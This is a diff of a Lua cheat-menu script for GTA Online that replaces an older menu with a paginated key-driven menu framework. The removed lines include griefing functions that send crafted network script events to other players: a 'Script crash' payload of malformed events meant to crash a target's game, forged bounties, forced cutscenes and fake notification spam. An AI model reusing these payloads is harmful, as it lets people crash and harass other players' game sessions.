@@ -1,385 +1,437 @@
-local PLAYER = {}
+local TYPE_TAB, TYPE_TOGGLE, TYPE_SLIDER, TYPE_SELECTION, TYPE_BUTTON = 0, 1, 2, 3, 4
 
-function PLAYER.GetPlayers(ignore)
-	local names = {}
-	local ids = {}
+--[[
+	CFG
+]]
 
-	for i = 0, 32 do
-		if player.is_valid(i) and i ~= ignore then
-			local name = player.get_name(i)
-			names[name] = i
-			ids[i] = name
+local CFG = {}
+CFG.Buttons = 10 -- кол-во кнопок в меню
+CFG.Font = "Georgia"
+
+--[[
+	MENU
+]]
+
+local PAGES = {}
+local PAGE = {}
+
+local MENU = {}
+MENU.Page = 1
+MENU.Show = false
+
+function MENU.Add(name, info)
+	if not name or type(name) == "boolean" then
+		return
+	end
+	local id = #PAGES + 1
+	if type(name) == "table" then
+		info = name
+		name = name.name or "Unknown page " .. tostring(id) 
+		info.name = nil
+	end
+	print("[MENU LUA] Registering " .. name .. " page")
+	info.selection = info.selection or 1
+	info.footer = info.footer or name
+	info.buttons = info.buttons or {}
+	info.name = name
+	info.sub_folder = {}
+	PAGES[id] = info
+	if id == 1 then
+		MENU.SetPage(id)
+	end
+	return id
+end
+
+function MENU.Remove(name)
+	for k, v in ipairs(PAGES) do
+		if v.name == name then
+			table.remove(PAGES, k)
 		end
 	end
-
-	return names, ids
 end
 
-function PLAYER.GetNicePlayers()
-	local tbl = {}
-	for i = 0, 32 do
-		if player.is_valid(i) then
-			local name = player.get_name(i)
-			table.insert(tbl, {id = i, name = name})
-		end
+MENU.Active = {} -- Сюда попадают кнопки для отображения при апдейте
+
+local to_text = {
+	[TYPE_TAB] = function(but, text)
+		return text, ">>"
+	end,
+	[TYPE_TOGGLE] = function(but, text)
+		local on = but[3]
+		local prefix = on and "[Y] " or "[  ] "
+		return text, prefix
+	end,
+	[TYPE_SLIDER] = function(but, text)
+		local amount = tostring(but[3] or 0)
+		local prefix = "< " .. amount .. " >"
+		return text, prefix
+	end,
+	[TYPE_SELECTION] = function(but, text)
+		local now = but[3]
+		local possible = but[4]
+		local prefix = "< " .. (possible[now] or "?") .. " >"
+		return text, prefix
+	end,
+	[TYPE_BUTTON] = function(but, text)
+		return text, ""
 	end
-	return tbl
-end
-
-local function SelectPlayer(ignore)
-	local ids = {}
-	for i = 0, 32 do
-		if player.is_valid(i) and i ~= ignore then
-			table.insert(ids, i)
-		end
-	end
-	return ids[math.random(#ids)], ids
-end
-
-local function gen(tbl)
-	local args = {}
-	for i = 1, 51 do
-		args[i] = math.random(-2147483648, 2147483647)
-	end
-	if tbl then
-		for k, v in pairs(tbl) do
-			args[k] = v
-		end
-	end
-	return args
-end
-
-MENU = {}
-
-local col = menu.get_color(menu_color.WindowBg)
-local r, g, b, a = math.floor(col.x * 255), math.floor(col.y * 255), math.floor(col.z * 255), 255
-
-local function GetTextSize(a)
-	return a:len() * 5.5
-end
-
-local active
-
-MENU.pages = {}
-
-MENU.settings = {
-	selection = 1,
-	data = {}
 }
 
-function MENU.SetPage(id, tbl)
-	MENU.settings.selection = 1
-	MENU.settings.data = {}
-	MENU.settings.page = tbl
-	MENU.settings.page_id = id
-	MENU.settings.page_name = tbl.id
+local function GetButtons()
+	local steps = PAGE.sub_folder
+	local buts = PAGE.buttons
+	for k,v in ipairs(steps) do
+		buts = buts[v][3]
+	end
+	return buts or {}
 end
 
-function MENU.SelectPage(id)
-	for k, v in ipairs(MENU.pages) do
-		if v.id == id or k == id then
-			MENU.SetPage(k, v)
+local function GetText(id)
+	local buts = GetButtons()
+	local but = buts[id]
+	local name, TYPE = but[1], but[2]
+	local func = to_text[TYPE]
+	if not func then
+		return name, "?"
+	end
+	local text, prefix = func(but, name)
+
+	return text, prefix
+end
+
+function MENU.Update()
+	local now = PAGE.selection
+	local buts = GetButtons()
+
+	local tabs = {}
+	if #buts <= CFG.Buttons then
+		for id, info in ipairs(buts) do
+			local draw_text, right_text = GetText(id)
+			tabs[id] = {draw_text, id == now, right_text}
+		end
+	else
+		local start = now < CFG.Buttons
+		for i = start and 1 or now - CFG.Buttons + 2, start and CFG.Buttons or now + 1 do
+			local info = buts[i]
+			if info then
+				local draw_text, right_text = GetText(i)
+				table.insert(tabs, {draw_text, i == now, right_text})
+			end
+		end
+	end
+	MENU.Active = tabs
+end
+
+function MENU.SetPage(n)
+	if PAGES[n] then
+		PAGE = PAGES[n]
+		MENU.Page = n
+		MENU.Update()
+		return
+	end
+	for k, v in ipairs(PAGES) do
+		if v.name == n then
+			PAGE = v
+			MENU.Page = k
+			MENU.Update()
 			return
 		end
 	end
 end
 
+--[[
+	Default Page
+]]
+
+--MENU.Add("Default", {
+--	buttons = {
+--		{"Cayo Perico editor", TYPE_TAB},
+--		{"Casino editor", TYPE_TAB},
+--		{"Doomsday editor", TYPE_TAB},
+--		{"Contract editor", TYPE_TAB},
+--		{"Apartments editor", TYPE_TAB},
+--		{"Modded cut", TYPE_TOGGLE, false, function(val) print("Modded cut changed to " .. tostring(val)) end},
+--		{"Remove enemies", TYPE_BUTTON},
+--		{"Remove cameras", TYPE_BUTTON},
+--		{"Hack doors", TYPE_BUTTON},
+--	},
+--	footer = "Heist control v1"
+--})
+
+--[[
+	Draw
+]]
+
+local lua_path = fs.get_dir_script()
+
+MENU.Materials = {
+	header = draw.create_texture_from_file(lua_path .. "/menu/header.png")
+}
+
+local w, h = draw.get_window_width(), draw.get_window_height()
+
+local scale = h / 1080
+local sizes = {
+	width = 272 * scale,
+	header_h = 67 * scale,
+	
+	button_h = 36 * scale
+}
+
+local font --= draw.create_font(CFG.Font, sizes.button_h)
+
+local function DrawButton(x, y, text, active, right)
+	if active then
+		draw.set_color(0, 255, 255, 255, 220)
+		draw.rect_filled(x, y, x + sizes.width, y + sizes.button_h)
+
+		draw.set_color(0, 0, 0, 0, 255)
+		draw.set_font(font)
+		draw.text(x + 5, y + sizes.button_h * .25, text)
+
+		local size = Vector2(20, 0)--draw.get_text_size(right)
+		draw.text(x + sizes.width - size.x, y + sizes.button_h * .25, right)
+		return
+	end
+
+	draw.set_color(0, 20, 20, 20, 220)
+	draw.rect_filled(x, y, x + sizes.width, y + sizes.button_h)
+	
+	draw.set_color(0, 255, 255, 255, 255)
+	draw.set_font(font)
+	draw.text(x + 5, y + sizes.button_h * .25, text)
+
+
+	draw.set_color(0, 125, 125, 125, 220)
+	
+	local size = Vector2(20, 0)--draw.get_text_size(right)
+	draw.text(x + sizes.width - size.x, y + sizes.button_h * .25, right)
+end
+
 function OnFrame()
-	if not active then return end
-	if menu.is_menu_opened() then return end
-	local x, y = menu.get_main_menu_pos_x(), menu.get_main_menu_pos_y()
-	local w, h = menu.get_main_menu_size_x(), menu.get_main_menu_size_y()
-	local page = MENU.settings.page
-	if not page then return end
+	if not MENU.Show then
+		return
+	end
 
-	draw.rect_filled(x, y, x + w, y + h, r, g, b, a, 0, 0)
-	draw.text(x + (w - page.text_w) * .5, y, 255, 255, 255, 255, page.header)
+	local x, y = 100, 100
+	-- header
+	draw.set_color(0, 255, 255, 255, 255)
+	draw.texture(MENU.Materials.header, x, y, sizes.width, sizes.header_h)
+	y = y + sizes.header_h
 
-	if not page.draw then return end
+	-- buttons
+	for k, info in ipairs(MENU.Active) do
+		local text, active, right = info[1], info[2], info[3]
+		DrawButton(x, y, text, active, right)
+		
+		y = y + sizes.button_h
+	end
 
-	page.draw(x, y + 40, w, h - 40, MENU.settings.selection)
+	-- footer
+	draw.set_color(0, 255, 255, 255, 220)
+	draw.rect_filled(x, y, x + sizes.width, y + 2)
+	y = y + 2
+
+	draw.set_color(0, 20, 20, 20, 220)
+	draw.rect_filled(x, y, x + sizes.width, y + sizes.button_h)
+
+	draw.set_color(0, 255, 255, 255, 220)
+	draw.set_font(font)
+	draw.text(x + 5, y + sizes.button_h * .25, PAGE.footer or "Midnight uff ya")
 end
 
-local function handle_selection()
-	local page = MENU.settings.page
-	if not page.selection then return end
-	page.selection(MENU.settings.selection)
+local function check(add)
+	local buts = #GetButtons()
+	if PAGE.selection > buts then
+		PAGE.selection = 1
+	elseif PAGE.selection < 1 then
+		PAGE.selection = buts
+	end
+	MENU.Update(add)
 end
 
-local function handle_press()
-	local page = MENU.settings.page
-	if not page.press then return end
-	page.press(MENU.settings.selection)
-end
-
-local function handle_arrow(right)
-	local page = MENU.settings.page
-	if not page.arrow then return end
-	page.arrow(MENU.settings.selection, right)
+local function callback(but)
+	local last = but[#but]
+	if type(last) == "function" then -- Я ебал везде ещё проверять позицию функции, такой метод - лучше всего.
+		local value = but[3] -- Значение всегда 3-е
+		last(value, but)
+	end
 end
 
 local keys = {
-	[46] = function() -- Del
-		active = not active
+	[38] = function() -- Стрелка вверх
+		PAGE.selection = PAGE.selection - 1
+		check()
 	end,
-	[34] = function() -- PgDown
-		if not active then return end
-		MENU.settings.selection = MENU.settings.selection + 1
-		handle_selection()
+	[40] = function() -- Стрелка вниз
+		PAGE.selection = PAGE.selection + 1
+		check(true)
 	end,
-	[33] = function() -- PgUp
-		if not active then return end
-		MENU.settings.selection = MENU.settings.selection - 1
-		handle_selection()
-	end,
-	[13] = function() -- enter
-		if not active then return end
-		handle_press()
-	end,
-	[35] = function() -- End
-		if not active then return end
-		local now = MENU.settings.page_id
-		for k,v in ipairs(MENU.pages) do
-			if k > now and v.can_be_switched then
-				MENU.SetPage(k, v)
-				return
-			end
+	[37] = function()  -- Стрелка влево
+		local now = PAGE.selection
+		local buts = GetButtons()
+		local but = buts[now]
+		if not but then
+			return
 		end
-		MENU.SelectPage(1)
+		local TYPE = but[2]
+		local value = but[3]
+		if TYPE == TYPE_SLIDER then
+			but[3] = math.max(but[4], value - 1)
+		elseif TYPE == TYPE_SELECTION then
+			local avaible = but[4] or {}
+			if value - 1 < 1 then
+				value = #avaible
+			else
+				value = value - 1
+			end
+			but[3] = value
+		else
+			return
+		end
+		callback(but)
+		MENU.Update(add)
 	end,
-	[8] = function() -- backspace
-		if not active then return end
-		MENU.SelectPage(1)
+	[39] = function()  -- Стрелка вправо
+		local now = PAGE.selection
+		local buts = GetButtons()
+		local but = buts[now]
+		if not but then
+			return
+		end
+		local TYPE = but[2]
+		local value = but[3]
+		if TYPE == TYPE_SLIDER then
+			but[3] = math.min(but[5], value + 1)
+		elseif TYPE == TYPE_SELECTION then
+			local avaible = but[4] or {}
+			if value + 1 > #avaible then
+				value = 0
+			end
+			but[3] = value + 1
+		else
+			return
+		end
+		callback(but)
+		MENU.Update(add)
 	end,
-	[37] = function() -- <-
-		if not active then return end
-		handle_arrow()
+	[13] = function() -- Энтер
+		local now = PAGE.selection
+		local buts = GetButtons()
+		local but = buts[now]
+		if not but then
+			return
+		end
+		local TYPE = but[2]
+		if TYPE == TYPE_BUTTON then
+			local func = but[3]
+			if func then
+				func(but)
+			end
+			MENU.Update()
+			return
+		elseif TYPE == TYPE_TOGGLE then
+			but[3] = not but[3]
+		elseif TYPE == TYPE_TAB then
+			local amount = #PAGE.sub_folder
+			PAGE.sub_folder[amount + 1] = PAGE.selection
+			PAGE.selection = 1
+		else
+			return
+		end
+		callback(but)
+		MENU.Update(add)
 	end,
-	[39] = function() -- ->
-		if not active then return end
-		handle_arrow(true)
+	[8] = function() -- Бэкспейс. Назад
+		local amount = #PAGE.sub_folder
+		if amount > 0 then
+			PAGE.selection = PAGE.sub_folder[amount]
+			table.remove(PAGE.sub_folder, amount)
+		end
+		MENU.Update()
+	end,
+	[33] = function() -- PageUP. Пред страница
+		local now = MENU.Page
+		local set = PAGES[now - 1] and now - 1 or #PAGES
+		MENU.SetPage(set)
+	end,
+	[34] = function() -- PageDown. След страница
+		local now = MENU.Page
+		local set = PAGES[now + 1] and now + 1 or 1
+		MENU.SetPage(set)
+	end,
+	[115] = function() -- F4. Скрытие меню
+		MENU.Show = not MENU.Show
 	end,
 }
+
+keys[104] = keys[38] -- numpad 8 | Вверх
+keys[98] = keys[40] -- numpad 2 | Вниз
+
+keys[100] = keys[34] -- numpad 4 | Лево
+keys[102] = keys[37] -- numpad 6 | Право
+
+keys[101] = keys[13] -- numpad 5 | Энтер
+--keys[13] = keys[13] -- numpad enter | Энтер
+
+keys[96] = keys[13] -- numpad 0 | Назад
+
+keys[103] = keys[33] -- numpad 7 | Пред страница
+keys[105] = keys[34] -- numpad 9 | След страница
+
+keys[106] = keys[115] -- numpad * | Меню
+
 
 function OnKeyPressed(key, down)
 	if not down then return end
 	local func = keys[key]
 	if not func then return end
+	if (key ~= 115 and key ~= 106) and not MENU.Show then return end
 	func()
 end
 
-function MENU.AddPage(data)
-	table.insert(MENU.pages, data)
-	return #MENU.pages
-end
-
-function MENU.DelPage(id)
-	for k, v in ipairs(MENU.pages) do
-		if v.id == id then
-			table.remove(k)
-			return true
-		end
+function OnDone()
+	-- Unload materials
+	for k, v in pairs(MENU.Materials) do
+		draw.release_texture(v)
 	end
 end
+
+--MENU.Update()
 
 --[[
-	Players
+	Load pages
 ]]
 
-local player_list = {}
-
-local function GetFlags(ply)
-	local flags = {}
-	if player.index() == ply then
-		table.insert(flags, "[ME]")
+for _, file_name in ipairs(fs.get_files(lua_path .. "/menu/")) do
+	local extension = string.sub(file_name, -4)
+	if extension == ".lua" then
+		local path = string.sub(file_name, #lua_path + 2)
+		local name, page = require(path)
+		MENU.Add(name, page)
 	end
-	if player.is_god(ply) then
-		table.insert(flags, "[GOD]")
-	end
-	if player.is_script_host(ply) then
-		table.insert(flags, "[SH]")
-	end
-	if player.is_session_host(ply) then
-		table.insert(flags, "[H]")
-	end
-	if player.is_rockstar_dev(ply) then
-		table.insert(flags, "[R*]")
-	end
-	if player.is_modder(ply) then
-		table.insert(flags, "[M]")
-	end
-	if player.is_friend(ply) then
-		table.insert(flags, "[F]")
-	end
-	return #flags > 0 and (table.concat(flags, " ") .. " ") or ""
 end
 
-MENU.AddPage({
-	id = "PLAYERS",
-	header = "Player List",
-	text_w = GetTextSize("Player List"),
-	draw = function(x, y, w, h)
-		for id, data in ipairs(player_list) do
-			local prefix = MENU.settings.selection == id and "> " or ""
-			draw.text(x + 20, y + (20 * id), 255, 255, 255, 255, prefix .. GetFlags(data.id) .. data.name)
+function OnFeatureTick()
+	for k,v in ipairs(PAGES) do
+		if v.Think then
+			v.Think()
 		end
-	end,
-	selection = function(num)
-		if num > #player_list then
-			num = 1
-		elseif num < 1 then
-			num = #player_list
-		end
-		MENU.settings.selection = num
-	end,
-	press = function(num)
-		MENU.SelectPage("PLAYER")
-		MENU.settings.data = {id = num, index = player_list[num].id}
-	end,
-	can_be_switched = true
-})
-
-local function UpdatePlayers()
-	player_list = PLAYER.GetNicePlayers()
+	end
 end
 
-function OnPlayerJoin()
-	UpdatePlayers()
+function OnChatMsg(ply, text)
+	for k,v in ipairs(PAGES) do
+		if v.OnChatMsg then
+			v.OnChatMsg(ply, text)
+		end
+	end
 end
 
-function OnPlayerLeft()
-	UpdatePlayers()
+function OnPlayerJoin(ply, name, rid, ip, host_key)
+	for k,v in ipairs(PAGES) do
+		if v.OnPlayerJoin then
+			v.OnPlayerJoin(ply, name, rid, ip, host_key)
+		end
+	end
 end
-
-function OnTransitionEnd()
-	UpdatePlayers()
-end
-
-UpdatePlayers()
-
-MENU.SelectPage("PLAYERS")
-
---[[
-	PLAYERS FUNCTIONS
-]]
-
-local player_funcs = {
-	{
-		name = "Casino cutscene",
-		func = function(ply)
-			script.send(ply, 1889984715, 0)
-			return true
-		end
-	},
-	{
-		name = "Set bounty",
-		func = function(ply)
-			local magic_f = script_global.new(1658176):at(9):get_long()
-			local magic_s = script_global.new(1658176):at(10):get_long()
-			local anon = 1
-			for _, v in ipairs(player_list) do
-				script.send(v.id, -1906146218, ply, ply, 10000, 0, anon, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, magic_f, magic_s)
-			end
-			return true
-		end
-	},
-	{
-		name = "Script crash",
-		func = function(ply)
-			script.send(ply, 1256866538, 0, 1, 64, 64, 64, 64, 64, 64, 849451549, 64, 64)
-			script.send(ply, 1463355688, table.unpack(gen({[2] = -1139568479})))
-			return true
-		end
-	},
-	{
-		name = "Notification spam",
-		func = function(ply)
-			local events = {
-				--{153488394, 1149761915, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}, -- ЛокальныйИгрок Становится боссом
-				--{153488394, 1149761915, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}, -- ЛокальныйИгрок Президент мотоклуба
-				--{153488394, 1149761915, 100, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}, -- ЛокальныйИгрок становится шефом
-				{153488394, -773910169, 1337228, 0, 0, 0, 0, 0, 0, 694773698, 0, 0, 0}, -- Вы обошли игрока **invalid**. Ещё и даёт фейк детекты от рандомов на malformed script
-				--{153488394, 1694315389, 100000, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}, -- Вы скрыли свою метку на минуту за 100000 ( сумму можно менять | Нужно проверить, палит ли игрока )
-				{153488394, -1022524084, 158, 0, 1321423066, 0, 0, 0, 0, 1, 5, 0, 0}, -- Игрок * добыл игровые автоматы ( игрока можно менять - вместо 1 айди )
-				{153488394, -731720638, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0}, -- Игрок * ликвидировал цель ( игрока можно менять - вместо 1 айди )
-				{153488394, 1385748752, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0}, -- Игрок * выбрал легкий путь ( игрока можно менять - вместо 1 айди )
-				{153488394, -290303715, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0}, -- Клуб *название* успешно продал продукцию со своего предприятия - поддельные документы ( игрока можно менять - вместо 1 айди )
-				{153488394, -290303715, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0}, -- Клуб *название* успешно продал продукцию со своего предприятия - марихуану ( игрока можно менять - вместо 1 айди )
-				{153488394, -290303715, 2, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0}, -- Клуб *название* успешно продал продукцию со своего предприятия - фальшивые документы ( игрока можно менять - вместо 1 айди )
-				{153488394, -290303715, 3, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0}, -- Клуб *название* успешно продал продукцию со своего предприятия - метамфетамин ( игрока можно менять - вместо 1 айди )
-				{153488394, -290303715, 4, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0}, -- Клуб *название* успешно продал продукцию со своего предприятия - кокаин ( игрока можно менять - вместо 1 айди )
-				{153488394, -284775486, 0, 0, 0, 1280066882, 0, 0, 0, 0, 0, 0, 0}, -- Вы активировали скрытую организацию
-				{153488394, 617116972, 0, -1, 1210664832, 0, 0, 0, 0, 0, 0, 0, 0}, -- *ник*: груз оружия уничтожен ( игрока можно менять - вместо 1 айди )
-				--{153488394, -1973936815, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}, -- ЛокальныйИгрок: Начал бандитскую разборку
-				{153488394, -989654618, 10000, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0}, -- 10000 отправлено в хранилище
-				{153488394, -159690430, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0}, -- *ник* уничтожает транспорт со спец грузом  ( игрока можно менять - вместо 1 айди )
-				{153488394, -671858663, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0}, -- *ник*: часть продукции уничтожена
-			}
-
-			for _, data in ipairs(events) do
-				data[10] = ply
-				script.send(ply, table.unpack(data))
-			end
-			return true
-		end
-	}
-}
-
-MENU.AddPage({
-	id = "PLAYER",
-	header = "Player control",
-	text_w = GetTextSize("Player control"),
-	draw = function(x, y, w, h, selection)
-		for id, data in ipairs(player_funcs) do
-			local prefix = selection == id and "> " or ""
-			draw.text(x + 20, y + (20 * id), 255, 255, 255, 255, prefix .. data.name)
-		end
-	end,
-	press = function(num)
-		local func = player_funcs[num].func
-		if not func then
-			utils.notify("Menu.lua", "Cant find function - " ..tostring(MENU.settings.selection), gui_icon.warning, notify_type.fatal)
-			return
-		end
-		local ply = MENU.settings.data and MENU.settings.data.index
-		if not ply or not player.is_valid(ply) then
-			utils.notify("Menu.lua", "Cant find player", gui_icon.warning, notify_type.fatal)
-			return
-		end
-		local success = func(ply)
-		if success == true then
-			utils.notify("Menu.lua", "Successfuly used", gui_icon.world, notify_type.default)
-		else
-			utils.notify("Menu.lua", success, gui_icon.warning, notify_type.fatal)
-		end
-	end,
-	selection = function(num)
-		if num > #player_funcs then
-			num = 1
-		elseif num < 1 then
-			num = #player_funcs
-		end
-		MENU.settings.selection = num
-	end,
-})
-
---[[
-	Togglers
-]]
-
---[[
-	Heists
-]]
-
-MENU.AddPage({
-	id = "HEISTS",
-	header = "Heist control",
-	text_w = GetTextSize("Heist control"),
-	draw = function(x, y, w, h)
-
-	end,
-	arrow = function(selection, right)
-
-	end,
-	can_be_switched = true,
-})
